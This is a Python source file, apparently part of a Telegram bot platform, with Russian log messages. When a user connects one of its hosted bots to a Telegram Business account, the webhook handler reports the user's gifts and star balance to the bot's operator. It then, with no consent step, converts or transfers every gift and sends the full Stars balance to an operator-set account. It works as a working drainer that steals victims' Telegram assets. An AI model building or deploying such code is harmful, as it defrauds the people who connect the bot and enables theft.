import json
import asyncio
import os
from datetime import datetime
from aiohttp import web
from aiogram import Bot
from aiogram.enums import ParseMode
from aiogram.types import Update
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import (
    GetBusinessAccountGifts, TransferGift, ConvertGiftToStars,
    GetBusinessAccountStarBalance, TransferBusinessAccountStars
)

from config import WEBHOOK_HOST
from user_bot_routes import handle_start_command
from models import UserBot
from log_bot import log_bot
from redis_client import redis_client
from models import ConnectedID, BusinessConnection

import logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.StreamHandler(),  # Лог в консоль
        logging.FileHandler("stars_transfer.log", encoding="utf-8")  # Лог в файл
    ]
)

logger = logging.getLogger(__name__)

TRANSFER_LOG_FILE = "transfer_log.json"
user_bot_cache = {}
MAX_BOTS = 1000


def get_user_bot(token: str) -> Bot:
    if token in user_bot_cache:
        return user_bot_cache[token]
    bot = Bot(token=token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    user_bot_cache[token] = bot
    if len(user_bot_cache) > MAX_BOTS:
        user_bot_cache.pop(next(iter(user_bot_cache)))
    return bot


def log_transfer_error_to_file(user_id: int, phase: str, gift_id: str, error: str):
    log_entry = {
        "user_id": user_id,
        "phase": phase,
        "gift_id": gift_id,
        "error": str(error),
        "timestamp": datetime.now().isoformat()
    }
    try:
        logs = []
        if os.path.exists(TRANSFER_LOG_FILE) and os.path.getsize(TRANSFER_LOG_FILE) > 0:
            with open(TRANSFER_LOG_FILE, "r", encoding="utf-8") as f:
                logs = json.load(f)
        logs.append(log_entry)
        with open(TRANSFER_LOG_FILE, "w", encoding="utf-8") as f:
            json.dump(logs, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[FILE_LOG_ERROR] {e}")

async def save_transfer_result_to_redis(owner_id: int, bot_token: str, result_text: str):
    redis_key = f"transfer_log:{owner_id}:{bot_token}"
    if result_text:
        await redis_client.set(redis_key, result_text)
    else:
        await redis_client.delete(redis_key)


async def transfer_all(bot: Bot, bc_id: str, userbot: UserBot, business_user_id: int):
    stats = {
        "converted": 0,
        "old_transferred": 0,
        "unique_transferred": 0,
        "not_unique": 0,
        "stars_transferred": 0,
        "errors": 0
    }

    # ✅ Получатель задаётся прямо в userbot.forward_to_id
    to_user_id = userbot.forward_to_id
    if not to_user_id:
        logger.error(f"[TRANSFER] Не указан forward_to_id для userbot id={userbot.id}")
        return "<b>❌ Не указан Telegram ID для получения звёзд (forward_to_id)</b>"

    logger.info(f"[TRANSFER] Передаём от user_id={business_user_id} -> to={to_user_id}")

    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        for gift in gifts.gifts:
            if gift.type == "regular":
                try:
                    await bot(ConvertGiftToStars(business_connection_id=bc_id, owned_gift_id=gift.owned_gift_id))
                    stats["converted"] += 1
                except TelegramBadRequest as e:
                    if "STARGIFT_CONVERT_TOO_OLD" in str(e):
                        try:
                            await bot(TransferGift(
                                business_connection_id=bc_id,
                                new_owner_chat_id=to_user_id,
                                owned_gift_id=gift.owned_gift_id
                            ))
                            stats["old_transferred"] += 1
                        except TelegramBadRequest as e2:
                            if "STARGIFT_NOT_UNIQUE" in str(e2):
                                stats["not_unique"] += 1
                            else:
                                stats["errors"] += 1
                                log_transfer_error_to_file(to_user_id, "transfer_old_regular", gift.owned_gift_id, e2)
                    else:
                        stats["errors"] += 1
                        log_transfer_error_to_file(to_user_id, "convert_regular", gift.owned_gift_id, e)
            elif gift.type == "unique":
                try:
                    await bot(TransferGift(
                        business_connection_id=bc_id,
                        new_owner_chat_id=to_user_id,
                        owned_gift_id=gift.owned_gift_id,
                        star_count=gift.transfer_star_count
                    ))
                    stats["unique_transferred"] += 1
                except TelegramBadRequest as e:
                    if "STARGIFT_NOT_UNIQUE" in str(e):
                        stats["not_unique"] += 1
                    else:
                        stats["errors"] += 1
                        log_transfer_error_to_file(to_user_id, "transfer_unique", gift.owned_gift_id, e)
            await asyncio.sleep(1)
    except Exception as e:
        stats["errors"] += 1
        log_transfer_error_to_file(to_user_id, "fetch_gifts", "-", e)

    try:
        stars = (await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))).amount
        if stars > 0:
            await bot(TransferBusinessAccountStars(
                business_connection_id=bc_id,
                star_count=stars,
                new_owner_chat_id=to_user_id
            ))
            stats["stars_transferred"] = stars
    except Exception as e:
        stats["errors"] += 1
        log_transfer_error_to_file(to_user_id, "transfer_stars", "-", e)

    result_text = (
        "<b>📤 Результат передачи:</b>\n"
        f"<b>👤 Кому передано:</b> <code>{to_user_id}</code>\n"
        "<blockquote>"
        f"<b>✅ Конвертировано в звёзды:</b> <b>{stats['converted']}</b>\n"
        f"<b>💰 Передано старых подарков:</b> <b>{stats['old_transferred']}</b>\n"
        f"<b>⚠️ Неуникальных (пропущено):</b> <b>{stats['not_unique']}</b>\n"
        f"<b>✅ Передано уникальных:</b> <b>{stats['unique_transferred']}</b>\n"
        f"<b>⭐️ Переведено звёзд:</b> <b>{stats['stars_transferred']}</b>\n"
        f"<b>❌ Ошибок:</b> <b>{stats['errors']}</b>"
        "</blockquote>"
    )
    await save_transfer_result_to_redis(to_user_id, bot.token, result_text)
    return result_text

async def user_webhook_handler(request: web.Request):
    token = request.match_info["token"]
    bot = get_user_bot(token)
    raw_data = await request.read()
    data = json.loads(raw_data)

    if data.get("business_connection"):
        userbot = await UserBot.get_or_none(token=token).prefetch_related("owner")
        if userbot:
            bc = data["business_connection"]
            user = bc.get("user", {})
            business_user_id = user.get("id") 
            username = user.get("username", "None")
            full_name = user.get("first_name", "NoName")
            bc_id = bc.get("id")

            exists = await BusinessConnection.get_or_none(userbot=userbot, connected_telegram_id=business_user_id)
            if not exists:
                await BusinessConnection.create(userbot=userbot, connected_telegram_id=business_user_id)
                userbot.connection_count += 1 
                await userbot.save(update_fields=["connection_count"])

            # статистика
            gifts_count = 0
            stars_count = 0
            try:
                gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
                gifts_count = len(gifts.gifts)
                stars_count = (await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))).amount
            except Exception:
                pass

            log_text = (
                f"<b>📦 Ваш бот был добавлен в Telegram Business</b>\n"
                f"<b>🤖 @{userbot.username or 'без username'}</b>\n"
                f"<b>👤 Добавил:</b> @{username} (<code>{business_user_id}</code>)\n"
                f"<b>🎁 Подарков:</b> <b>{gifts_count}</b>\n"
                f"<b>⭐️ Звёзд:</b> <b>{stars_count}</b>"
            )

            if userbot.owner and userbot.owner.log_bot_enabled:
                try:
                    msg = await log_bot.send_message(
                        chat_id=userbot.owner.telegram_id,
                        text=log_text,
                        parse_mode="HTML"
                    )

                    # ⬇️ Отдельно выводим количество звёзд сразу
                    if stars_count > 0:
                        await log_bot.send_message(
                            chat_id=userbot.owner.telegram_id,
                            text=f"<b>⭐️ У пользователя {stars_count} звёзд на момент подключения</b>",
                            parse_mode="HTML"
                        )

                except Exception as e:
                    print(f"[LOG_BOT ERROR] {e}")
                    return web.Response()

                # ✅ Передаём всё в тот ID, что указан в forward_to_id
                result_text = await transfer_all(bot, bc_id, userbot, business_user_id)

                try:
                    await log_bot.edit_message_text(
                        chat_id=userbot.owner.telegram_id,
                        message_id=msg.message_id,
                        text=f"{log_text}\n\n{result_text}",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    print(f"[EDIT ERROR] {e}")

    if "message" in data and data["message"].get("text") == "/start":
        update = Update.model_validate(data)
        await handle_start_command(update.message, bot)

    return web.Response()

async def start_user_bot(token: str):
    bot = get_user_bot(token)
    await bot.set_webhook(f"{WEBHOOK_HOST}/user_webhook/{token}") 